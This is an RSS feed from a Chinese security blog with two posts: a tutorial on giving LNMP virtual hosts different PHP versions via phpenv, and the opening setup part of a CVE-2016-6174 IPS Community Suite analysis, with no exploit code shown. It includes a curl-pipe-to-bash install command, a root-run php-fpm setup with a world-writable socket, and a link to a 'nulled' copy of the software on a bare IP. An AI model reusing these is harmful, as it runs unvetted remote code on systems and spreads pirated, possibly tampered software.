<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    
    <title><![CDATA[Hc1m1]]></title>
    <link>http://0x48.pw//</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    <description><![CDATA[水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会]]></description>
    <pubDate>Tue, 16 Aug 2016 15:32:53 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title><![CDATA[LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP]]></title>
      <link>http://0x48.pw/2016/08/16/0x20/</link>
      <guid>http://0x48.pw/2016/08/16/0x20/</guid>
      <pubDate>Tue, 16 Aug 2016 15:31:44 GMT</pubDate>
      <description>
      <![CDATA[<p>LNMP: <a href="https://lnmp.org/">https://lnmp.org/</a><br>phpenv-installer: <a href="https://github.com/rogeriopradoj/phpenv-installer">https://github.com/rogeriopradoj/phpenv-installer</a></p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>LNMP: <a href="https://lnmp.org/" target="_blank" rel="external">https://lnmp.org/</a><br>phpenv-installer: <a href="https://github.com/rogeriopradoj/phpenv-installer" target="_blank" rel="external">https://github.com/rogeriopradoj/phpenv-installer</a></p>
<a id="more"></a>
<p>LNMP是Linux平台下一键安装Mysql + PHP + Nginx服务的一键安装包，傻瓜式安装环境，没啥好说的。</p>
<p>然后是使用phpenv-installer去安装phpenv</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>curl -<span class="constant">L </span><span class="symbol">http:</span>/<span class="regexp">/git.io/phpenv</span>-installer | bash</span><br></pre></td></tr></table></figure>
<p>然后把写下这段写入<code>~/.bashrc</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PHPENV_ROOT=<span class="string">"/root/.phpenv"</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="operator">-d</span> <span class="string">"<span class="variable">$&#123;PHPENV_ROOT&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$&#123;PHPENV_ROOT&#125;</span>/bin:<span class="variable">$&#123;PATH&#125;</span>"</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">"<span class="variable">$(phpenv init -)</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p>
<p>然后<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>source .bashrc</span><br><span class="line"><span class="variable">$ </span>phpenv update</span><br><span class="line"><span class="variable">$ </span>phpenv install -l  <span class="comment">#可以查看可安装的php版本</span></span><br><span class="line"><span class="variable">$ </span>phpenv install <span class="number">5.6</span>.<span class="number">0</span>  <span class="comment"># 使用phpenv install 版本号   安装相应版本的php</span></span><br></pre></td></tr></table></figure></p>
<p>因为是测试环境, 我使用的都是root用户, phpenv是安装在<code>/root/.phpenv</code></p>
<p>然后刚才安装5.6.0版本的php, 安装目录在 <code>/root/.phpenv/versions/5.6.0</code></p>
<p>安装过程需要一系列函数库, 如果你电脑里没有则会报错</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#以下是我服务器需要的函数库</span><br><span class="line">$ sudo apt install libreadline6-<span class="built_in">dev</span> libtidy-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span></span><br></pre></td></tr></table></figure>
<p>然后还会报如下错误:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ext/xmlrpc/libxmlrpc/.libs/encodings.o: <span class="keyword">In</span> <span class="keyword">function</span> `convert<span class="comment">':</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">73</span>: undefined reference <span class="keyword">to</span> `libiconv_open<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">81</span>: undefined reference <span class="keyword">to</span> `libiconv<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">101</span>: undefined reference <span class="keyword">to</span> `libiconv_close<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">101</span>: undefined reference <span class="keyword">to</span> `libiconv_close<span class="comment">'</span></span><br></pre></td></tr></table></figure></p>
<p>查到的导致该错误的原因：<a href="http://tonybai.com/2013/04/25/a-libiconv-linkage-problem/" target="_blank" rel="external">http://tonybai.com/2013/04/25/a-libiconv-linkage-problem/</a><br>没有啥好的解决方法，临时解决方法是把<code>/usr/local/lib/libiconv.so</code>删除<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mv /usr/<span class="keyword">local</span>/<span class="keyword">include</span>/iconv.<span class="keyword">h</span> /usr/<span class="keyword">local</span>/<span class="keyword">include</span>/iconv.<span class="keyword">h</span>.bak</span><br></pre></td></tr></table></figure></p>
<p>然后改编了一下<code>php-fpm</code>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">$ cp /etc/init.d/php-fpm ./php-fpm.sh</span><br><span class="line">$ cat php-fpm.sh</span><br><span class="line"></span><br><span class="line"><span class="shebang">#! /bin/sh</span><br><span class="line"></span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:          php-fpm</span></span><br><span class="line"><span class="comment"># Required-Start:    $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop:     $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:      0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: starts php-fpm</span></span><br><span class="line"><span class="comment"># Description:       starts the PHP FastCGI Process Manager daemon</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">prefix=/root/.phpenv/versions/<span class="variable">$2</span></span><br><span class="line"><span class="built_in">exec</span>_prefix=<span class="variable">$&#123;prefix&#125;</span></span><br><span class="line"></span><br><span class="line">php_fpm_BIN=<span class="variable">$&#123;exec_prefix&#125;</span>/sbin/php-fpm</span><br><span class="line">php_fpm_CONF=<span class="variable">$&#123;prefix&#125;</span>/etc/php-fpm.conf</span><br><span class="line">php_fpm_PID=<span class="variable">$&#123;prefix&#125;</span>/var/run/php-fpm.pid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php_opts=<span class="string">"--fpm-config <span class="variable">$php_fpm_CONF</span> --pid <span class="variable">$php_fpm_PID</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">wait_for_pid</span></span> () &#123;</span><br><span class="line">	try=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">test</span> <span class="variable">$try</span> <span class="operator">-lt</span> <span class="number">35</span> ; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">			<span class="string">'created'</span>)</span><br><span class="line">			<span class="keyword">if</span> [ <span class="operator">-f</span> <span class="string">"<span class="variable">$2</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">				try=<span class="string">''</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			;;</span><br><span class="line"></span><br><span class="line">			<span class="string">'removed'</span>)</span><br><span class="line">			<span class="keyword">if</span> [ ! <span class="operator">-f</span> <span class="string">"<span class="variable">$2</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">				try=<span class="string">''</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			;;</span><br><span class="line">		<span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> -n .</span><br><span class="line">		try=`expr <span class="variable">$try</span> + <span class="number">1</span>`</span><br><span class="line">		sleep <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">	start)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Starting php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$php_fpm_BIN</span> --daemonize <span class="variable">$php_opts</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ <span class="string">"$?"</span> != <span class="number">0</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid created <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	stop)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Gracefully shutting down php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -QUIT `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid removed <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed. Use force-quit"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	status)</span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm is stopped"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">0</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		PID=`cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line">		<span class="keyword">if</span> ps -p <span class="variable">$PID</span> | grep -q <span class="variable">$PID</span>; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm (pid <span class="variable">$PID</span>) is running..."</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm dead but pid file exists"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	force-quit)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Terminating php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -TERM `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid removed <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	restart)</span><br><span class="line">		<span class="variable">$0</span> stop</span><br><span class="line">		<span class="variable">$0</span> start</span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	reload)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Reload service php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -USR2 `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	configtest)</span><br><span class="line">		<span class="variable">$php_fpm_BIN</span> -t</span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	*)</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|force-quit|restart|reload|status|configtest&#125;"</span></span><br><span class="line">		<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure></p>
<p>参加以前虚拟主机的一键脚本需要改改<code>/bin/lnmp</code><br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;<span class="regexp">/usr/local</span><span class="regexp">/nginx/conf</span><span class="regexp">/vhost/</span><span class="variable">$&#123;</span>domain&#125;.conf&lt;&lt;<span class="constant">EOF</span></span><br><span class="line">server</span><br><span class="line">    &#123;</span><br><span class="line">        listen <span class="number">80</span>;</span><br><span class="line">        <span class="comment"># listen [::]:80;</span></span><br><span class="line">        server_name <span class="variable">$&#123;</span>domain&#125;<span class="variable">$&#123;</span>moredomainame&#125;;</span><br><span class="line">        index index.html index.htm index.php default.html default.htm default.php;</span><br><span class="line">        root  <span class="variable">$&#123;</span>vhostdir&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$&#123;</span>rewrite&#125;.conf;</span><br><span class="line">        <span class="comment"># error_page   404   /404.html;</span></span><br><span class="line">        <span class="comment"># include enable-php.conf;</span></span><br><span class="line"></span><br><span class="line">        location ~ [^<span class="regexp">/]\.php(/</span>|<span class="variable">$)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># comment try_files \$uri =404; to enable pathinfo</span></span><br><span class="line">            try_files \<span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">            fastcgi_pass  <span class="symbol">unix:</span>/tmp/php-cgi.sock;</span><br><span class="line">            fastcgi_index index.php;</span><br><span class="line">            <span class="keyword">include</span> fastcgi.conf;</span><br><span class="line">            <span class="comment"># include pathinfo.conf;</span></span><br><span class="line">        &#125;</span><br><span class="line">        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)<span class="variable">$</span><br><span class="line"></span>        &#123;</span><br><span class="line">            expires      <span class="number">30</span>d;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ .*\.(js|css)?<span class="variable">$</span><br><span class="line"></span>        &#123;</span><br><span class="line">            expires      <span class="number">12</span>h;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$&#123;</span>al&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="constant">EOF</span></span><br></pre></td></tr></table></figure></p>
<p>然后写了一个一键生成相应php版本的虚拟主机: <code>diff_php_vhost_add.sh</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">"<span class="variable">$1</span>"</span> ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Please enter vhost name"</span>;</span><br><span class="line">        <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">"<span class="variable">$2</span>"</span> ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Please enter php version"</span>;</span><br><span class="line">        <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">groupadd <span class="variable">$1</span></span><br><span class="line">useradd <span class="variable">$1</span> -M <span class="operator">-s</span> /sbin/nologin -g <span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">cat &gt;/root/.phpenv/versions/<span class="variable">$2</span>/etc/php-fpm.conf&lt;&lt;EOF</span><br><span class="line">[global]</span><br><span class="line">pid = /root/.phpenv/versions/<span class="variable">$2</span>/var/run/php-fpm.pid</span><br><span class="line">error_<span class="built_in">log</span> = /root/.phpenv/versions/<span class="variable">$2</span>/var/<span class="built_in">log</span>/php-fpm.log</span><br><span class="line"><span class="built_in">log</span>_level = notice</span><br><span class="line"></span><br><span class="line">[<span class="variable">$1</span>]</span><br><span class="line">listen = /tmp/php-cgi-<span class="variable">$2</span>.sock</span><br><span class="line"><span class="comment">#listen = 127.0.0.1:9000</span></span><br><span class="line">listen.backlog = -<span class="number">1</span></span><br><span class="line">listen.allowed_clients = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">listen.owner = <span class="variable">$1</span></span><br><span class="line">listen.group = <span class="variable">$1</span></span><br><span class="line">listen.mode = <span class="number">0666</span></span><br><span class="line">user = <span class="variable">$1</span></span><br><span class="line">group = <span class="variable">$1</span></span><br><span class="line">pm = dynamic</span><br><span class="line">;pm = static</span><br><span class="line">pm.max_children = <span class="number">10</span></span><br><span class="line">pm.start_servers = <span class="number">2</span></span><br><span class="line">pm.min_spare_servers = <span class="number">1</span></span><br><span class="line">pm.max_spare_servers = <span class="number">6</span></span><br><span class="line">request_terminate_timeout = <span class="number">100</span></span><br><span class="line">request_slowlog_timeout = <span class="number">0</span></span><br><span class="line">slowlog = var/<span class="built_in">log</span>/slow-<span class="variable">$2</span>.log</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span> | lnmp vhost add</span><br><span class="line">chown <span class="variable">$1</span>:<span class="variable">$1</span> -R /home/wwwroot/<span class="variable">$1</span></span><br><span class="line">sed -i <span class="string">"s/php-cgi/php-cgi-<span class="variable">$2</span>/g"</span> /usr/<span class="built_in">local</span>/nginx/conf/vhost/<span class="variable">$1</span>.conf</span><br><span class="line"></span><br><span class="line">/root/php-fpm.sh restart <span class="variable">$2</span></span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p>
<p>好了。。前期准备工作就好了, 以后增加特定版本php的虚拟主机只要两句命令<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ phpenv install [<span class="property">version</span>]     <span class="comment"># 安装相应版本的php</span></span><br><span class="line">$ ./diff_php_vhost_add.sh [vhost] [<span class="property">version</span>]  <span class="comment">#有两个参数, 第一个是虚拟主机名, 第二个是php版本号, 必需得已经使用phpenv安装成功的</span></span><br></pre></td></tr></table></figure></p>
<h2 id="最后">最后</h2><p>我的一键脚本路径都是写死的, 已经我是用来做测试的, 所以都放在<code>/root</code>目录下, 如果不用root的, 自己把脚本里的路径改成相应路径<br>下次有空自己写个和一键配合的lnmp脚本</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/16/0x20/#disqus_comments</comments>
    </item>
    
    <item>
      <title><![CDATA[CVE-2016-6174漏洞分析]]></title>
      <link>http://0x48.pw/2016/08/10/0x1F/</link>
      <guid>http://0x48.pw/2016/08/10/0x1F/</guid>
      <pubDate>Wed, 10 Aug 2016 13:02:51 GMT</pubDate>
      <description>
      <![CDATA[<p>IPS Community Suite Remote Code Execution Analysis</p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>IPS Community Suite Remote Code Execution Analysis</p>
<a id="more"></a>
<p>花了三天时间去分析这漏洞, 两天搞环境, 半天分析漏洞, 半天写总结。</p>
<p>然后研究了一个phpenv + lnmp的不同虚拟主机不同php版本, 写了一个一键新建相应php版本的虚拟主机脚本, 会在之后的文章中发出来。</p>
<p>漏洞分析参考链接：<a href="http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/" target="_blank" rel="external">http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/</a><br>测试应用: <a href="http://115.159.191.193/source/IPS.Community.Suite.4.1.12.3_nulled.zip" target="_blank" rel="external">IPS.Community.Suite.4.1.12.3_nulled.zip</a></p>
<p>对于IPS远程代码执行的漏洞, 我觉得是比较鸡肋的, 因为关键有一个PHP版本的限制:</p>
<p><code>&lt;=5.4.24 &amp;&amp; 5.5.0-5.5.8</code></p>
<p>在安装4.1.12.3版本的IPS时, 该CMS会检测服务器的PHP版本, 要求 <code>&gt;=5.5.0</code>, 建议<code>&gt;5.6.0</code></p>
<p>所以说有效版本应该是 <code>5.5.0-5.5.8</code>, 小于等于<code>5.4.24</code>版本时, IPS根本无法安装</p>
<p>我使用的测试版本: 5.5.0, 安装的时候会产生致命bug, 我花了一天去调bug, 也没能根本解决.</p>
<p>在安装的最后一步, 应该是安装模块库之类的, 在每个安装步骤中定位到一句 <code>unset( \IPS\.*::i()-&gt;* ); //比如 unset( \IPS\Data\Store::i()-&gt;settings );</code></p>
<p>如果你直接输出unset的内容 <code>var_dump( \IPS\Data\Store::i()-&gt;settings );exit;</code>, 你会发现CMS报错了, 但是是输出一系列数组, 并没有解释错误的具体原因, 而unset一个error的变量, 显然会爆炸, 导致502</p>
<p>而该CMS安装的过程中一个步骤错误, 安装就会终止不会继续进行下去了, 而且会error的变量我并没有找到啥特征, 而且并不是所有这类的变量都会error, 所以没能在根本上解决问题, 不过我装IPS又不是为了使用, 只是为了用来研究漏洞, 所以把unset注释了, 可以从表面上解决该问题, 不过会出错的地方太多了, 我只能批量注释了：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$ grep "unset(.*::i()-&gt;" ./* -rl | xargs sed -i "s/unset( <span class="command">\\</span><span class="command">\\</span>IPS/<span class="command">\/</span><span class="command">\/</span>unset( <span class="command">\\</span><span class="command">\\</span>IPS/g"</span></span><br></pre></td></tr></table></figure>
<p>之后我使用php7.0安装IPS, 一下就好了, 没有出现任何问题, 所以我猜测该bug的原因应该是使用了一些不向下兼容的函数或新函数之类</p>
